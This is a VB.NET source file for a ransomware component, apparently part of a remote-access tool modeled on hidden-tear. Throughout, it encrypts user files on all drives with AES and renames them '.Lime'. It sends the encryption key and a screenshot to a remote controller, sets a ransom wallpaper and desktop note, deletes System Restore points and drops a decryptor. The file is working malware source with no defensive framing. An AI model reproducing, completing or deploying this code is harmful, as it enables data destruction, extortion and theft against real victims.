Imports System.Text
Imports System.Security.Cryptography
Imports System.IO
Imports System.Drawing
Imports System.Windows.Forms
'credit to hidden-tear creator

Public Class Encryption
    Public password As String
    Private userName As String = Environment.UserName
    Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte,
    ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
    Private Const KEYEVENTF_KEYUP = &H2
    Private Const VK_LWIN = &H5B
    Private C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
    Private num As Integer
    Public Mynote
    Public Mywallpaper
    Public Shared SPL As String = Main.SPL
    Public Logs As New System.Text.StringBuilder

    Public Sub BeforeAttack()
        Dim T1 As Threading.Thread = New Threading.Thread(AddressOf startAction)
        T1.Start()
    End Sub

    Private Function AES_Encrypt(ByVal bytesToBeEncrypted As Byte(), ByVal passwordBytes As Byte()) As Byte()
        On Error Resume Next
        Dim encryptedBytes As Byte() = Nothing
        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Using ms As MemoryStream = New MemoryStream()
            Using AES As RijndaelManaged = New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC
                Using cs = New CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
                    cs.Close()
                End Using

                encryptedBytes = ms.ToArray()
            End Using
        End Using

        Return encryptedBytes
    End Function

    Private Function CreatePassword(ByVal length As Integer) As String
        On Error Resume Next
        Const valid As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"
        Dim res As StringBuilder = New StringBuilder()
        Dim rnd As Random = New Random()
        While 0 < Math.Max(System.Threading.Interlocked.Decrement(length), length + 1)
            res.Append(valid(rnd.[Next](valid.Length)))
        End While

        Return res.ToString()
    End Function

    Private Sub EncryptFile(ByVal file As String, ByVal password As String)
        On Error Resume Next
        If file <> Application.ExecutablePath AndAlso file <> Main.FULLPATH AndAlso Not file.ToLower.Contains(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower.Replace("system32", Nothing)) Then
            Dim bytesToBeEncrypted As Byte() = IO.File.ReadAllBytes(file)
            Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
            Dim bytesEncrypted As Byte() = AES_Encrypt(bytesToBeEncrypted, passwordBytes)
            IO.File.WriteAllBytes(file, bytesEncrypted)
            System.IO.File.Move(file, file & ".Lime")
            Logs.Append(file + Environment.NewLine)
        End If
    End Sub

    Private Sub encryptDirectory(ByVal location As String, ByVal password As String)
        On Error Resume Next
        Dim validExtensions = String.Concat(".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7z", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent")
        Dim files As String() = Directory.GetFiles(location)
        Dim childDirectories As String() = Directory.GetDirectories(location)
        For i As Integer = 0 To files.Length - 1
            Dim extension As String = Path.GetExtension(files(i))
            If validExtensions.Contains(extension.ToLower) Then
                EncryptFile(files(i), password)
            End If
        Next

        For i As Integer = 0 To childDirectories.Length - 1
            encryptDirectory(childDirectories(i), password)
        Next
    End Sub

    Private Sub startAction()
        Try


            password = CreatePassword(15)
            Threading.Thread.CurrentThread.Sleep(1000)
            Main.Send("Key" + SPL + Main.BOT + SPL + password)

            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Encryption in progress...")

            Dim T1 As New Threading.Thread(AddressOf Fix_Drivers)
            Dim T2 As New Threading.Thread(AddressOf System_Driver)
            Dim T3 As New Threading.Thread(AddressOf OtherDrivers)

            T1.Start((password))
            T2.Start((password))
            T3.Start((password))

            Do Until num = 3
                Threading.Thread.Sleep(500)
            Loop

            num = Nothing
            password = Nothing

            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Encrypted")

            SetWallpaper()
            SendScreen()
            SetMessage()
            DeleteRestorePoints()
            DropDecryptor()



            Main.CloseMe()

        Catch ex As Exception
        End Try

        Exit Sub
    End Sub

#Region "Encrypt"
    Private Sub System_Driver(ByVal password As String)
        On Error Resume Next
        encryptDirectory(C_DIR, password)
        num += 1
    End Sub

    Private Sub Fix_Drivers(ByVal password As String)
        On Error Resume Next
        For Each drive In Environment.GetLogicalDrives
            Dim Driver As DriveInfo = New DriveInfo(drive)
            If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
                Dim DriverPath As String = drive
                encryptDirectory(DriverPath, password)
            End If
        Next
        num += 1
    End Sub

    Private Sub OtherDrivers(ByVal password As String)
        On Error Resume Next
        For Each drive In Environment.GetLogicalDrives
            Dim Driver As DriveInfo = New DriveInfo(drive)
            If Not Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
                Dim DriverPath As String = drive
                encryptDirectory(DriverPath, password)
            End If
        Next
        num += 1
    End Sub

#End Region

    Private Sub SetMessage()
        Try

            Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            Dim fullpath As String = path + "\READ-ME-NOW.txt"
            Dim Message As String = Mynote + Environment.NewLine + "Your ID is [" & Main.HWID + "]"
            File.WriteAllText(fullpath, Message + Environment.NewLine + Environment.NewLine + "[[Encrypted Files]]" + Environment.NewLine + Logs.ToString)
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-MSG", Message)
            Process.Start(fullpath)

        Catch ex As Exception
        End Try
    End Sub

    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const SPI_SETDESKWALLPAPER = 20
    Private Const SPIF_UPDATEINIFILE = &H1

    Private Sub SetWallpaper()
        Try
            Dim MYW = IO.Path.GetTempPath + "\LimeWALL.jpg"
            File.WriteAllBytes(MYW, Convert.FromBase64String(Mywallpaper))

            Dim key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
            key.SetValue("WallpaperStyle", "2")
            key.SetValue("TileWallpaper", "0")
            key.Flush()
            key.Close()
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, MYW, SPIF_UPDATEINIFILE)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub SendScreen()
        On Error Resume Next
        keybd_event(VK_LWIN, 0, 0, 0)
        keybd_event(77, 0, 0, 0)
        keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)

        Threading.Thread.Sleep(1000)

        Dim bounds As Rectangle
        Dim screenshot As Bitmap
        Dim graph As Graphics
        bounds = Windows.Forms.Screen.PrimaryScreen.Bounds
        screenshot = New Bitmap(bounds.Width, bounds.Height, Imaging.PixelFormat.Format32bppArgb)
        graph = Graphics.FromImage(screenshot)
        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)

        Dim TempFileName = Path.GetTempFileName + ".jpeg"
        screenshot.Save(TempFileName, Imaging.ImageFormat.Jpeg)

        Threading.Thread.CurrentThread.Sleep(1000)
        Main.Send("SC" + SPL + Main.BOT + SPL + Convert.ToBase64String(File.ReadAllBytes(TempFileName)))

    End Sub

    <Runtime.InteropServices.DllImport("Srclient.dll")>
    Public Shared Function SRRemoveRestorePoint(index As Integer) As Integer
    End Function
    Private Sub DeleteRestorePoints()

        Try
            Dim objClass As New Management.ManagementClass("\\.\root\default", "systemrestore", New System.Management.ObjectGetOptions())
            Dim objCol As Management.ManagementObjectCollection = objClass.GetInstances()

            For Each objItem As Management.ManagementObject In objCol
                SRRemoveRestorePoint(CUInt(objItem("sequencenumber")).ToString())
            Next
        Catch ex As Exception
        End Try

    End Sub

    Private Shared Function Privileges() As Boolean
        Try
            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function

    Private Sub DropDecryptor()
        Try
            Dim D = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECRYPT.exe")
            IO.File.WriteAllBytes(D, My.Resources.DECF)
            Process.Start(D)
        Catch ex As Exception
        End Try
    End Sub

End Class

